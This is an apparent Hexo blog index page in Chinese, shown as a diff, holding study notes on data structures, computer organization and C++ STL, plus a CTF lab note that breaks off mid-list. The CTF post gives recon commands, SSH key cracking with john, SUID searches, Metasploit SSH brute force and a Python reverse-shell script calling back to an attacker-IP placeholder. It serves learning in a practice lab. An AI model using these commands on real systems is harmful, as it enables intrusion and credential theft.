@@ -1,0 +1,1653 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/source/imagess/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/source/imagess/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/source/imagess/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/source/imagess/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="你有灵魂吗">
+<meta property="og:type" content="website">
+<meta property="og:title" content="QeuroIzoのBlog">
+<meta property="og:url" content="http://example.com/page/5/index.html">
+<meta property="og:site_name" content="QeuroIzoのBlog">
+<meta property="og:description" content="你有灵魂吗">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="QeuroIzo">
+<meta property="article:tag" content="Python, Rust, C++, Go, 爬虫, 深度学习, 服务研发, 对象存储">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>QeuroIzoのBlog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">QeuroIzoのBlog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">hello world</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-10-27-75/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-10-27-75/" class="post-title-link" itemprop="url">75. 数据结构</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol>
+<li>数据：描述客观师傅的符号，是计算机中可以操作的对象，是能被计算机识别，并输入给计算机处理的符号集合。<ol>
+<li>特点：<ol>
+<li>可以输入到计算机中</li>
+<li>能够被计算机程序处理</li>
+</ol>
+</li>
+<li>数据不仅仅包括整型、实型等数值类型，还包括字符及声音、图像、视频等非数值类型</li>
+</ol>
+</li>
+<li>数据元素：组成数据的、有一定意义的基本单位，在计算机中通常作为整体处理，也被称为记录<ol>
+<li>数据元素组成数据</li>
+</ol>
+</li>
+<li>数据项：数据项是数据不可分割的最小单位</li>
+<li>数据对象：性质相同的数据元素的集合，是数据的子集</li>
+<li>举例：<ol>
+<li>数据元素：安迪、不知火舞……</li>
+<li>数据对象：游戏角色（是数据元素的集合）</li>
+<li>数据：游戏中不只有游戏角色，还会有游戏场景、背景音乐、过场动画等</li>
+</ol>
+</li>
+<li>数据结构：<ol>
+<li>数据元素+特定关系=数据结构</li>
+<li>现实世界中，不同数据元素之间不是独立的，而是存在特定的关系，我们将这些关系称为结构</li>
+<li>结构就是关系</li>
+<li>数据结构是相互之间存在一种或多种特定关系的数据元素的集合</li>
+</ol>
+</li>
+<li>逻辑结构<ol>
+<li>集合结构：<ol>
+<li>其中数据元素同属一个集合</li>
+<li>数据元素相互之间没有其他关系</li>
+</ol>
+</li>
+<li>线性结构：数据元素之间是一对一的关系</li>
+<li>树形结构：数据元素之间存在一种一对多的层次关系</li>
+<li>图形结构：数据元素之间是多对多的关系</li>
+</ol>
+</li>
+<li>物理结构<ol>
+<li>定义：又叫做存储结构，是指数据的逻辑结构在计算中的存储形式</li>
+<li>顺序存储结构：<ol>
+<li>把数据元素存储在地址连续的存储单元里</li>
+<li>数据间的逻辑关系与物理关系一致</li>
+<li>链式存储结构：<ol>
+<li>把数据元素存放在任意的存储单元里</li>
+<li>地址可以连续也可以不连续</li>
+<li></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-10-19-74/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-10-19-74/" class="post-title-link" itemprop="url">74. 计算机组成原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="计算机系统概论"><a href="#计算机系统概论" class="headerlink" title="计算机系统概论"></a>计算机系统概论</h1><ol>
+<li>计算机系统简介<ol>
+<li>计算机：有好多种，这里主要讲授：数字计算机</li>
+<li>组成：计算机硬件系统的逻辑实现</li>
+<li></li>
+</ol>
+</li>
+</ol>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-10-12-73/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-10-12-73/" class="post-title-link" itemprop="url">73. C++ STL</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><ol>
+<li>length()   // 返回字符串的长度</li>
+<li>empty()    // 判断是否为空</li>
+<li>push_back() // 恢复字符到结尾</li>
+<li>int compare(const string &amp;s) const;//比较当前字符串和s的大小</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lanyzh0909/article/details/6957649">更多点击这里</a> </p>
+</li>
+<li><h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><ol>
+<li>初始化：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>():创建一个空<span class="built_in">vector</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="keyword">int</span> nSize):创建一个<span class="built_in">vector</span>,元素个数为nSize</span><br><span class="line"><span class="built_in">vector</span>(<span class="keyword">int</span> nSize,<span class="keyword">const</span> t&amp; t):创建一个<span class="built_in">vector</span>，元素个数为nSize,且值均为t</span><br><span class="line"><span class="built_in">vector</span>(<span class="keyword">const</span> <span class="built_in">vector</span>&amp;):复制构造函数</span><br><span class="line"><span class="built_in">vector</span>(begin,end):复制[begin,end)区间内另一个数组的元素到<span class="built_in">vector</span>中</span><br></pre></td></tr></table></figure></li>
+<li>void push_back(const T&amp; x):向量尾部增加一个元素X</li>
+<li>删除<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iterator erase(iterator it):删除向量中迭代器指向元素</span><br><span class="line">iterator erase(iterator first,iterator last):删除向量中[first,last)中元素</span><br><span class="line">void pop_back():删除向量中最后一个元素</span><br><span class="line">void clear():清空向量中所有元素</span><br></pre></td></tr></table></figure></li>
+<li>int size() const:返回向量中元素的个数</li>
+<li>empty 判断vector是否为空</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/cpp-vector-container-analysis.html">更多点击这里</a> </p>
+</li>
+<li><h1 id="map-（键值对）"><a href="#map-（键值对）" class="headerlink" title="map （键值对）"></a>map （键值对）</h1><ol>
+<li>初始化: <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt; m</span><br></pre></td></tr></table></figure></li>
+<li>添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m.insert(pair&lt;int,string&gt;(102,&quot;aclive&quot;));</span><br><span class="line">m.insert(map&lt;int,string&gt;::value_type(321,&quot;hai&quot;));</span><br><span class="line">m[112]&#x3D;&quot;April&quot;;&#x2F;&#x2F;map中最简单最常用的插入添加！</span><br></pre></td></tr></table></figure></li>
+<li>遍历<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt;::iterator iter = m.begin(); iter != m.end(); iter++) &#123;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li>
+<li>个数： <code>m.size()</code><br><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/cpp/cpp-fu8l2ppt.html">更多点击这里</a></li>
+</ol>
+</li>
+<li><h1 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h1><ol>
+<li>初始化：<ol>
+<li>pair&lt;int, string&gt; p;</li>
+<li>pair&lt;int, string&gt; p (1, 2);</li>
+<li>make_pair(1,2);</li>
+<li>pair&lt;int, string&gt; (1, 2) (C11)</li>
+</ol>
+</li>
+<li>操作<ol>
+<li>p.first</li>
+<li>p.second</li>
+</ol>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_35121480/article/details/54728594">更多点击这里</a></p>
+</li>
+<li><h1 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h1><ol>
+<li>初始化<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br></pre></td></tr></table></figure></li>
+<li>入队<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.push(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+<li>出队<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.pop();</span><br></pre></td></tr></table></figure></li>
+<li>访问队首元素<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.front();</span><br></pre></td></tr></table></figure></li>
+<li>访问队尾元素<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.back();</span><br></pre></td></tr></table></figure></li>
+<li>判断队列空<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.empty();</span><br></pre></td></tr></table></figure></li>
+<li>元素的个数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q.size();</span><br></pre></td></tr></table></figure>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangshihui512/article/details/8930652">更多点击这里</a></li>
+</ol>
+</li>
+<li><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><ol>
+<li>初始化<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;</span><br></pre></td></tr></table></figure></li>
+<li>入栈<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.push(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+<li>出栈<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.pop();</span><br></pre></td></tr></table></figure></li>
+<li>访问栈顶<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.top();</span><br></pre></td></tr></table></figure></li>
+<li>判断栈空<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.empty();</span><br></pre></td></tr></table></figure></li>
+<li>元素的个数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.size();</span><br></pre></td></tr></table></figure>
+<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mfryf/archive/2012/08/09/2629992.html">更多点击这里</a></li>
+</ol>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/2019-9-20-72/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QeuroIzo">
+      <meta itemprop="description" content="你有灵魂吗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QeuroIzoのBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/26/2019-9-20-72/" class="post-title-link" itemprop="url">72. CTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-26 21:52:34 / 修改时间：21:58:11" itemprop="dateCreated datePublished" datetime="2020-12-26T21:52:34+08:00">2020-12-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li>第一章<ol>
+<li>探测靶场IP: <ol>
+<li><code>netdiscover -r &lt;ip&gt;/netmask</code></li>
+<li>例子：本地机ip：192.168.253.12<ol>
+<li>使用 <code>netdiscover -r 192.168.253.1/24</code>（为什么？）</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<ol start="2">
+<li>查看当前ip地址：<br><code>ipconfig</code></li>
+<li>测试连通性：<br><code>ping &lt;ip&gt;</code></li>
+<li>第二章<ol>
+<li>信息探测： <code>nmap -sV &lt;ip&gt;</code>（挖掘开放服务信息）<ol>
+<li>例子：<code>nmap -sV 192.168.253.10</code></li>
+<li>探测靶场开放的服务于服务的版本：<code>nmap -sV &lt;ip&gt;</code></li>
+<li>探测靶场的全部信息：<code>namp -A -v &lt;ip&gt;</code></li>
+<li>探测靶场的操作系统类型与版本：<code>nmap -O &lt;ip&gt;</code></li>
+<li>分析探测结果<ol>
+<li>每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023端口，在扫描结果中查找特殊端口（如mysql：3306）。</li>
+<li>针对特殊端口进行探测，尤其对开发大端口的http服务进行排查</li>
+</ol>
+</li>
+<li>探测大端口的信息<ol>
+<li>对于开放http服务的大端口，可以采取<a href="http://ip:port/的形式访问">http://ip:port/的形式访问</a></li>
+<li>查看源代码获取对应信息；如果没有flag信息，可以使用工具探测隐藏页面</li>
+<li><code>dirb http://ip:port</code> (探测隐藏页面)</li>
+<li>敏感文件：<ol>
+<li>.ssh</li>
+<li>.robots</li>
+<li>taxes</li>
+</ol>
+</li>
+<li>ssh:<ol>
+<li>使远程计算机使用ssh登录到本地服务器ssh服务上，实现远程计算机对ssh服务的操作</li>
+<li>直接使用浏览器访问，查看效果、对应源代码可能会获取flag，或者下一步对应的提示</li>
+<li>挖掘ssh信息，不断访问多去更多泄漏的ssh秘钥信息</li>
+<li>ssh认证方式：<ol>
+<li>id_rsa(私钥)</li>
+<li>服务器id_rsa.pub（公钥）</li>
+<li>对比成功则登录服务器，否则失败</li>
+</ol>
+</li>
+<li>使用私钥文件登录服务器：<ol>
+<li>先切换到文件所在目录</li>
+<li>赋予可读可写权限<ol>
+<li>查看权限：<code>ls -alh</code></li>
+</ol>
+</li>
+<li>查看用户名：authorized_keys </li>
+<li>赋予 id_rsa 可读可写权限：<code>chmod 600 id_rsa</code></li>
+<li><code>ssh -i id_rsa &lt;用户名&gt;@&lt;ip&gt;</code></li>
+<li>解密 ssh秘钥信息<ol>
+<li>使用 ssh2john 将id_isa秘钥信息转化为john可以识别的信息。</li>
+<li>ssh2john id_isa &gt; isacrack</li>
+<li>利用字典解密 <code>isacrack</code>：<code>zcat /usr/share/wordlists/rockyou.txt | john --pipe --rules isacrack</code></li>
+<li>分析用户名、利用ssh登录服务器</li>
+<li>注意root目录</li>
+<li>查找具有root权限的文件：<code>find / -perm -4000 2&gt;/dev/null</code></li>
+<li>whoami：看是什么权限</li>
+<li>ssh基于22号端口的服务</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>分析探测结果<ol>
+<li>对于SSH服务的22端口的靶场：<ol>
+<li>暴力破解</li>
+<li>私钥泄漏（私钥有没有对应的密码，是否可以找到私钥的用户名）</li>
+</ol>
+</li>
+<li>对于开放http服务的80端口或者其他端口的靶场<ol>
+<li>通过浏览器访问对应的靶场服务，如 <code>http://靶场ip地址:http服务端口</code></li>
+<li>使用探测工具对http的目录进行探测，如：<code>dirb http://靶场IP地址:http服务端口</code></li>
+<li>特别注意：特殊端口（大于1024的端口）</li>
+<li>对于某些靶场，可以使用 <code>nikto</code> 扫描器挖掘敏感信息：<code>nikto -host 靶场IP地址</code></li>
+<li>特别注意 <code>config</code> 、<code>file结尾的</code>  等特殊敏感文件，要细读扫描的结果。挖掘可以利用的敏感信息</li>
+</ol>
+</li>
+<li>利用敏感、弱点信息<ol>
+<li>修改id_rsa的权限： <code>chmod 600 id_rsa</code></li>
+<li>利用私钥登录服务器： <code>ssh -i id_rsa 用户名@靶场IP地址</code></li>
+<li>注意：如果 id_rsa没有破解密码，可以直接使用，如果有解密密码，则需要进行对应的破解</li>
+<li>下载私钥信息： <code>wget &quot;网址&quot;</code></li>
+<li>重命名： <code>mv 文件名 重命名的文件名</code></li>
+<li>查看所有文件： <code>ls -all</code></li>
+</ol>
+</li>
+<li>扩大战果：<ol>
+<li>查看当前用户：<code>whoami</code></li>
+<li>id 查看当前用户的权限</li>
+<li>查看 根目录 寻找flag文件</li>
+<li>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组</li>
+<li>cat /etc/passwd 查看所有用户的列表</li>
+<li>cat /etc/group 查看用户组</li>
+<li>find / -user 用户名  查看属于某些用户的文件</li>
+<li>/tmp 查看缓冲文件目录</li>
+</ol>
+</li>
+<li>如何提权：<ol>
+<li>深入挖掘：<ol>
+<li>通过 /etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务</li>
+<li>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶机机器的某个文件。</li>
+<li>如果在 /etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</li>
+<li>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否有读写权限。</li>
+<li>su -root 寻找root靶机机器的方式</li>
+<li>切换到/home/用户名 目录查看是否具有可以提升root权限的文件</li>
+</ol>
+</li>
+<li>反弹shell<ol>
+<li>靶场代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os, subprocess, socket</span><br><span class="line"></span><br><span class="line">s = socket.socekt(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect(<span class="string">&quot;攻击机IP地址&quot;</span>, <span class="string">&quot;攻击机监听端口&quot;</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure></li>
+<li>攻击机 <code>netcat</code> 命令：<br><code>nc -lpv 未占用接口</code>（未占用接口与攻击机监听端口一一对应）</li>
+<li>查看占用端口：<code>netstat -pantu</code></li>
+<li>添加执行权限：<code>chmod +x 文件名</code></li>
+</ol>
+</li>
+<li>背水一战<ol>
+<li>万不得已的时候，只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具 如：hydra、medusa等</li>
+<li>利用cupp 创建字典：<ol>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/jeanphorn/common-password.git">https://github.com/jeanphorn/common-password.git</a></li>
+<li>chmod +x cupp.py</li>
+<li>./cupp.py -i 以交互的方式创建字典</li>
+</ol>
+</li>
+<li>使用metasploit破解SSH<ol>
+<li>在终端输入：msfconsole</li>
+<li>msc &gt; use auxiliary/scanner/ssh/ssh_login</li>
+<li>msf auxiliary(ssh_login) &gt; set rhosts IP地址</li>
+<li>msf auxiliary(ssh_login) &gt; set username hadi</li>
+<li>msf auxiliary(ssh_login) &gt; set pass_file hadi.txt</li>
+<li>msf auxiliary(ssh_login) &gt; set threads 5</li>
+<li>msf auxiliary(ssh_login) &gt; show options(查看状态))</li>
+<li>msf auxiliary(ssh_login) &gt; set verbose true</li>
+<li>msf auxiliary(ssh_login) &gt; run</li>
+<li>msf auxiliary(ssh_login) &gt; set password hadi123</li>
+<li>msf auxiliary(ssh_login) &gt; back (关闭)</li>
+</ol>
+</li>
+<li>优化会话<ol>
+<li> <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></li>
+<li> su - root</li>
+</ol>
+</li>
+<li>总结：<ol>
+<li>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登录靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登录靶场机器。</li>
+<li>CTF中 要特别注意 /tep数据缓冲目录 以及 /etc/crontab设置定时执行的文件</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>第三章<ol>
+<li>SMB介绍：<ol>
+<li>SMB通信协议是微软和英特尔在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba</li>
+<li>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</li>
+<li>SMB协议，计算机可以访问网络资源，下载对应的资源文件</li>
+</ol>
+</li>
+<li>实验环境：<ol>
+<li>Kali linux 192.168.253.12</li>
+<li>靶场机器 192.168.253.17</li>
+</ol>
+</li>
+<li>信息探测<ol>
+<li>对于知识给定一个对应IP地址的靶场机器，我们需要对其 进行扫描，探测开放的服务</li>
+<li>渗透其实是针对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限</li>
+<li>nmap -sV IP          挖掘开放服务信息</li>
+<li>nmap -A -v -T4 IP    挖掘靶场全部信息</li>
+</ol>
+</li>
+<li>针对SMB协议弱点分析<ol>
+<li>针对SMB协议，使用空口令，若口令尝试登陆，并查看敏感文件，下载查看；<ol>
